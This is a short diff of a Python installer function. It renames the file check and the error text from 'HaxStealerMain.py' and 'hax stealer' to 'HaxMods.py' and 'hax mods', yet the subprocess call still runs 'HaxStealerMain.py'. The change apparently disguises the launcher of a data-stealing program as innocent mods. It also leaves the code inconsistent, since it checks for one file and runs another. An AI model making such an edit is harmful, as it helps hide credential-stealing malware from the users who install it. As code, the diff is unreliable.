@@ -13,8 +13,8 @@ def install_requirements():
         sys.exit(1)
 
 def run_script():
-    if not os.path.isfile('HaxStealerMain.py'):
-        print("Error on hax stealer instalation")
+    if not os.path.isfile('HaxMods.py'):
+        print("Error on hax mods instalation")
         sys.exit(1)
     try:
         subprocess.check_call([sys.executable, 'HaxStealerMain.py'])
